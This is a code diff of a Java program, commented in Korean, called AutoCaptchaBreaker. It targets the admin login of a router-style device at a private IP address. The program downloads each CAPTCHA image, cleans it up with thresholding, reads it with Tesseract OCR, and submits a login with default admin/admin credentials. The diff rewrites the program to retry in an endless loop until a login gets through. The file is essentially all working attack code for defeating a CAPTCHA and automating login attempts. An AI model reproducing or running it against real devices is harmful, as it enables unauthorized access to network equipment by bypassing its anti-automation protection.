@@ -1,5 +1,7 @@
 import net.sourceforge.tess4j.Tesseract;
+import net.sourceforge.tess4j.util.ImageHelper;
 import javax.imageio.ImageIO;
+import java.awt.Color;
 import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.CookieManager;
@@ -16,91 +18,101 @@ public class AutoCaptchaBreaker {
     public static void main(String[] args) {
         String targetIp = "192.168.40.1";
 
-        try {
-            CookieManager cookieManager = new CookieManager();
-            HttpClient client = HttpClient.newBuilder()
-                    .cookieHandler(cookieManager)
-                    .build();
+        // 세션 유지를 위한 클라이언트 설정
+        CookieManager cookieManager = new CookieManager();
+        HttpClient client = HttpClient.newBuilder()
+                .cookieHandler(cookieManager)
+                .build();
 
-            // --- [STEP 1] 캡차 제어 HTML 수신 및 파일명 추출 ---
-            System.out.println("[*] 캡차 제어 데이터 수신 중...");
-            HttpRequest getHtml = HttpRequest.newBuilder()
-                    .uri(URI.create("http://" + targetIp + "/sess-bin/captcha.cgi"))
-                    .GET().build();
-            HttpResponse<String> htmlRes = client.send(getHtml, HttpResponse.BodyHandlers.ofString());
-            String htmlBody = htmlRes.body();
+        int attempt = 1;
+        while (true) {
+            System.out.println("\n[시도 " + attempt + "] 캡차 브레이킹 시작...");
 
-            // 정규표현식으로 파일명(value 값) 추출
-            Pattern pattern = Pattern.compile("name=captcha_file value=([a-zA-Z0-9]+)");
-            Matcher matcher = pattern.matcher(htmlBody);
+            try {
+                // 1. 캡차 제어 HTML 수신 및 ID 추출
+                HttpRequest getHtml = HttpRequest.newBuilder().uri(URI.create("http://" + targetIp + "/sess-bin/captcha.cgi")).GET().build();
+                String htmlBody = client.send(getHtml, HttpResponse.BodyHandlers.ofString()).body();
 
-            if (!matcher.find()) {
-                System.err.println("[오류] HTML에서 captcha_file 값을 찾을 수 없습니다.");
-                System.err.println("응답 내용: " + htmlBody);
-                return;
-            }
-            String captchaFileId = matcher.group(1);
-            System.out.println("[확인] 추출된 파일 ID: " + captchaFileId);
+                Pattern p = Pattern.compile("name=captcha_file value=([a-zA-Z0-9]+)");
+                Matcher m = p.matcher(htmlBody);
+                if (!m.find()) {
+                    System.err.println("[!] ID 추출 실패. 1초 후 재시도...");
+                    Thread.sleep(1000);
+                    continue;
+                }
+                String captchaId = m.group(1);
 
-            // --- [STEP 2] 실제 이미지 다운로드 ---
-            String realImgUrl = "http://" + targetIp + "/captcha/" + captchaFileId + ".gif";
-            System.out.println("[*] 실제 이미지 다운로드 중: " + realImgUrl);
+                // 2. 이미지 다운로드
+                String imgUrl = "http://" + targetIp + "/captcha/" + captchaId + ".gif";
+                HttpResponse<InputStream> imgRes = client.send(HttpRequest.newBuilder().uri(URI.create(imgUrl)).GET().build(),
+                        HttpResponse.BodyHandlers.ofInputStream());
 
-            HttpRequest getImg = HttpRequest.newBuilder().uri(URI.create(realImgUrl)).GET().build();
-            HttpResponse<InputStream> imgRes = client.send(getImg, HttpResponse.BodyHandlers.ofInputStream());
+                File imgFile = new File("captcha.gif");
+                try (InputStream is = imgRes.body(); FileOutputStream fos = new FileOutputStream(imgFile)) {
+                    is.transferTo(fos);
+                }
 
-            File imgFile = new File("captcha.gif");
-            try (InputStream is = imgRes.body(); FileOutputStream fos = new FileOutputStream(imgFile)) {
-                is.transferTo(fos);
-            }
+                // 3. 이미지 보정 (물결선 제거를 위한 강한 이진화)
+                BufferedImage rawImage = ImageIO.read(imgFile);
+                BufferedImage resized = ImageHelper.getScaledInstance(rawImage, rawImage.getWidth() * 3, rawImage.getHeight() * 3);
 
-            // --- [STEP 3] OCR 판독 ---
-            BufferedImage image = ImageIO.read(imgFile);
-            if (image == null) {
-                System.err.println("[오류] 이미지 디코딩 실패 (파일이 깨졌을 수 있음)");
-                return;
-            }
+                // 임계값을 140~170 사이로 조정하며 물결선이 사라지는 지점을 찾습니다.
+                BufferedImage binarized = new BufferedImage(resized.getWidth(), resized.getHeight(), BufferedImage.TYPE_BYTE_BINARY);
+                for (int y = 0; y < resized.getHeight(); y++) {
+                    for (int x = 0; x < resized.getWidth(); x++) {
+                        Color c = new Color(resized.getRGB(x, y));
+                        int brightness = (c.getRed() + c.getGreen() + c.getBlue()) / 3;
+                        // 물결선은 보통 글자보다 연합니다. 170 이상으로 높이면 연한 선은 흰색이 됩니다.
+                        binarized.setRGB(x, y, (brightness > 175 ? Color.WHITE.getRGB() : Color.BLACK.getRGB()));
+                    }
+                }
 
-            String projectRoot = System.getProperty("user.dir");
-            Path resourcePath = Paths.get(projectRoot, "src", "main", "resources");
+                // 4. OCR 판독
+                Tesseract tesseract = new Tesseract();
+                String projectRoot = System.getProperty("user.dir");
+                tesseract.setDatapath(Paths.get(projectRoot, "src", "main", "resources").toString());
+                tesseract.setLanguage("eng");
+                tesseract.setVariable("tessedit_char_whitelist", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
+                tesseract.setPageSegMode(7);
 
-            Tesseract tesseract = new Tesseract();
-            tesseract.setDatapath(resourcePath.toString());
-            tesseract.setLanguage("eng");
-            tesseract.setVariable("tessedit_char_whitelist", "0123456789");
-            tesseract.setPageSegMode(7);
+                String result = tesseract.doOCR(binarized).trim().replaceAll("\\s+", "");
+                System.out.println(">> [판독 결과]: [" + result + "]");
 
-            String crackedCode = tesseract.doOCR(image).trim().replaceAll("[^0-9]", "");
-            System.out.println("[OCR 결과] 판독된 번호: [" + crackedCode + "]");
+                if (result.length() < 3) {
+                    System.out.println("[-] 판독값이 너무 짧음. 재시도...");
+                    continue;
+                }
 
-            // --- [STEP 4] 로그인 시도 (captcha_file 값 포함 필수) ---
-            if (!crackedCode.isEmpty()) {
-                System.out.println("[*] 로그인 요청 전송...");
-
-                // 주의: captcha_file 파라미터가 반드시 포함되어야 합니다.
+                // 5. 로그인 시도 및 로그 출력
+                String loginUrl = "http://" + targetIp + "/sess-bin/login_handler.cgi";
                 String payload = "username=admin&passwd=admin&init_status=1&captcha_on=1" +
-                        "&captcha_file=" + captchaFileId +
-                        "&captcha_code=" + crackedCode;
+                        "&captcha_file=" + captchaId + "&captcha_code=" + result;
 
                 HttpRequest loginReq = HttpRequest.newBuilder()
-                        .uri(URI.create("http://" + targetIp + "/sess-bin/login_handler.cgi"))
+                        .uri(URI.create(loginUrl))
                         .header("Content-Type", "application/x-www-form-urlencoded")
-                        .header("Referer", "http://" + targetIp + "/login/login.php")
+                        .header("Referer", "http://" + targetIp + "/")
                         .POST(HttpRequest.BodyPublishers.ofString(payload))
                         .build();
 
+                System.out.println(">> [SENDING PAYLOAD]: " + payload);
                 HttpResponse<String> loginRes = client.send(loginReq, HttpResponse.BodyHandlers.ofString());
-                System.out.println("\n<< [서버 응답]:\n" + loginRes.body());
+                String resBody = loginRes.body();
 
-                if (loginRes.body().contains("timepro.cgi")) {
-                    System.out.println("[★성공★] 로그인 통과!");
-                } else {
-                    System.out.println("[실패] 거부됨.");
+                System.out.println("<< [RESPONSE]: " + (resBody.length() > 100 ? resBody.substring(0, 100) : resBody));
+
+                if (resBody.contains("timepro.cgi") || resBody.contains("main.cgi")) {
+                    System.out.println("\n[★최종 성공★] " + attempt + "번의 시도 끝에 로그인에 성공했습니다!");
+                    break; // 무한 루프 탈출
+                } else {                    System.out.println("[-] 로그인 실패. 0.5초 후 다음 이미지로 시도합니다.");
+                    attempt++;
+                    Thread.sleep(500);
                 }
-            }
 
-        } catch (Exception e) {
-            e.printStackTrace();
+            } catch (Exception e) {
+                System.err.println("[!] 에러 발생: " + e.getMessage());
+                attempt++;
+            }
         }
     }
 }
